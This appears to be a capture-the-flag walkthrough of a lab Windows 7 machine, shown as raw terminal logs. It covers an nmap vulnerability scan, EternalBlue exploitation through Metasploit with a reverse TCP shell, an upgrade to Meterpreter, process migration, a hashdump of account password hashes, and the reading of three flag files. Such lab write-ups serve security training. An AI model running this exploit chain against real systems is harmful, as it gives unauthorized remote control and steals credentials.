
## Scan the machine.

```bash

╭─[LAPTOP-HRI3FQ3J] as root in ~                                                                                                           20:35:28
╰──➤ nmap -T4 -Pn -v --script vuln 10.10.79.113
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 20:35 -03
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:35
Completed NSE at 20:35, 10.00s elapsed
Initiating NSE at 20:35
Completed NSE at 20:35, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:35
Completed Parallel DNS resolution of 1 host. at 20:35, 1.16s elapsed
Initiating SYN Stealth Scan at 20:35
Scanning 10.10.79.113 [1000 ports]
Discovered open port 445/tcp on 10.10.79.113
Discovered open port 139/tcp on 10.10.79.113
Discovered open port 3389/tcp on 10.10.79.113
Discovered open port 135/tcp on 10.10.79.113
Discovered open port 49154/tcp on 10.10.79.113
Discovered open port 49152/tcp on 10.10.79.113
Discovered open port 49153/tcp on 10.10.79.113
Discovered open port 49159/tcp on 10.10.79.113
Discovered open port 49158/tcp on 10.10.79.113
Completed SYN Stealth Scan at 20:36, 32.41s elapsed (1000 total ports)
NSE: Script scanning 10.10.79.113.
Initiating NSE at 20:36
NSE: [ssl-ccs-injection] No response from server: ERROR
Completed NSE at 20:37, 92.45s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Nmap scan report for 10.10.79.113
Host is up (0.28s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 136.55 seconds
           Raw packets sent: 1336 (58.784KB) | Rcvd: 1203 (48.164KB)

```

```bash

msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

```

```bash

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.79.113
RHOST => 10.10.79.113
```

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.18.20.23
LHOST => 10.18.20.23
```

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.18.20.23:4444
[*] 10.10.79.113:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.10.79.113:445      - Rex::ConnectionTimeout: The connection with (10.10.79.113:445) timed out.
[*] 10.10.79.113:445      - Scanned 1 of 1 hosts (100% complete)
[-] 10.10.79.113:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.18.20.23:4444
[*] 10.10.79.113:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.79.113:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.79.113:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.79.113:445 - The target is vulnerable.
[*] 10.10.79.113:445 - Connecting to target for exploitation.
[+] 10.10.79.113:445 - Connection established for exploitation.
[+] 10.10.79.113:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.79.113:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.79.113:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.79.113:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.79.113:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.79.113:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.79.113:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.79.113:445 - Sending all but last fragment of exploit packet
[*] 10.10.79.113:445 - Starting non-paged pool grooming
[+] 10.10.79.113:445 - Sending SMBv2 buffers
[+] 10.10.79.113:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.79.113:445 - Sending final SMBv2 buffers.
[*] 10.10.79.113:445 - Sending last fragment of exploit packet!
[*] 10.10.79.113:445 - Receiving response from exploit packet
[+] 10.10.79.113:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.79.113:445 - Sending egg to corrupted connection.
[*] 10.10.79.113:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.79.113
[*] Command shell session 1 opened (10.18.20.23:4444 -> 10.10.79.113:49215) at 2023-02-13 20:58:43 -0300
[+] 10.10.79.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.79.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.79.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----


C:\Windows\system32>

```

```bash
C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.20.23:4444 -> 10.10.79.113:49215 (10.10.79.113)

```

```bash

msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

```

```bash

msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

```

```bash

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1

```

```bash

msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.18.20.23:4433
[*] Post module execution completed

```

```bash

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

```bash

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 140   564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 428   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 484   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 556   1984  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 564   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 612   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 624   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 664   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 712   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 720   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 728   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 840   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 904   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 952   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1020  664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1088  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1196  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1340  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1424  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1496  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1632  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1956  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1984  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2080  840   WmiPrvSE.exe
 2136  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 2448  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2480  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2636  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2680  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2808  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM

```

```bash
meterpreter > migrate 1632
[*] Migrating from 1984 to 1632...
[*] Migration completed successfully.
```

```bash

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```

```bash
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 00:13:36 -0300  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 02:08:56 -0300  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 00:20:08 -0300  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 19:22:01 -0300  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 19:28:38 -0300  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 19:35:57 -0300  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 00:13:22 -0300  Recovery
040777/rwxrwxrwx  4096   dir   2023-02-13 21:04:38 -0300  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 00:13:28 -0300  Users
040777/rwxrwxrwx  16384  dir   2019-03-17 19:36:30 -0300  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 16:27:21 -0300  flag1.txt
000000/---------  0      fif   1969-12-31 21:00:00 -0300  hiberfil.sys
000000/---------  0      fif   1969-12-31 21:00:00 -0300  pagefile.sys

meterpreter > cat flag1.txt
flag{access_the_machine}
```

```bash
meterpreter > pwd
C:\Windows\System32\config
meterpreter > cat flag2.txt
flag{sam_database_elevated_access}
```

```bash

meterpreter > pwd
C:\Users\Jon\Documents
meterpreter > cat flag3.txt
flag{admin_documents_can_be_valuable}

```

```bash
